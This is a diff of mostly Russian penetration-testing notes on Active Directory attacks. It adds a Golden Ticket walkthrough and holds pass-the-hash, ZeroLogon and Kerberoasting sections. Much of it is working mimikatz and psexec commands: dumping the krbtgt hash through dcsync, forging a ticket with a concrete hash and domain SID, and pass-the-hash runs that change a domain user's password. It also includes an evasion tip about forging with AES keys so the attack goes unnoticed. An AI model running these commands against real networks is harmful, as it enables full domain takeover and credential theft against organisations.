@@ -1,14 +1,52 @@
+# Golden Ticket
+
+1. Получили доступ к домен-контроллеру через psexec. Запускаем mimikatz:
+`lsadump::dcsync /user:krbtgt`
+
+2. Забираем _Hash NTLM_
+`Hash NTLM : 8bf56c4f95a012ac7191216a11b242d3`
+  
+3. Получаем полное имя домена:
+`ipconfig /all`
+
+4. Получаем SID домена (PS> Get-ADDomain). Создаем golden ticket на *доменной машине*
+
+`mimikatz # kerberos::golden /rc4:8bf56c4f95a012ac7191216a11b242d3 /user:Administrator /domain:COMPANY.RU /sid:S-1-5-21-2300122653-3816496348-2769763471`
+
+`/rc4` - we will use RC4 encryption using the NT hash we previously stole (5525e655c06299c7e4179e2cc5621fb3) as a key
+`/user` - the target username is Administrator
+`/domain` -  the target domain name is sec560.local
+`/sid` - the target domain SID (Security Identifier)
+
+5. Выгружаем тикет на удалённую машину и выполняет Pass-the-ticket (PtT). _сmd.exe_ нужно запустить от Администратора.
+
+`kerberos::ptt C:\Tools\mimikatz\ticket.kirbi`
+
+`exit`
+
+Проверяем подгрузку тикета:
+
+`klist`
+
+Получаем доступ ко всем хостам:
+
+`psexec64.exe \\dc cmd.exe`
+
+*Созданный тикет обладает следующими ограничениями:*
+- действителен в течение 10 лет;
+- ServiceKey that is used is the krbtgt RC4 key (NT hash);
+- A small note on evasion: If we want to make our attack more stealthy, we would choose to steal the AES keys of the krbtgt account and generate a golden ticket using AES instead of RC4.
+ In a typical environment, AES is the dominant Kerberos encryption type in use and using RC4 is an anomaly in and of itself that would warrant further investigation.
+
 # Path-the-Hash
 Входные данные:
 - требует права для фальсификации токена;
 
-## Запускаем удаленный powershell.
+1. Запускаем удаленный powershell.
 sekurlsa::pth /domain:company.ru /user:kstepanovAdm /ntlm:39aced871bfb9485b15c0ddcd3b456f3 /run:"powershell.exe"
 
-## Меняем пароль пользователя в домене. Пароль должен удовлетворять текущей парольной политике!
+2. Меняем пароль пользователя в домене. Пароль должен удовлетворять текущей парольной политике!
 sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed8dbae888073 /run:"net user buhramin Qwerty15 /domain"
-
-
 
 # ZeroLogon
 Входные данные:
@@ -43,7 +81,6 @@ lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authu
 	
 Есть скрипт restorepassword.py (https://github.com/dirkjanm/CVE-2020-1472)
 
-
 # Kerberoasting
 
 Входные данные:
@@ -60,9 +97,6 @@ lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authu
 		+ запрос TGS это легитимное действие пользователя.
 		+ по сравнению c online подбором пароля сервисной учетной записи в том, что после выгрузке TGS обращение NTLM-хеша проводится в оффлайне;
 		
-Вопросы:
-	- почему данная конфигурация возможна? Например, SQL Server 2014 самостоятельно создает сервисные записи с нормальными паролями.
-
 Примеры использования:
 	- PT (https://youtu.be/WE8JjboUtDY?t=1962)
 	
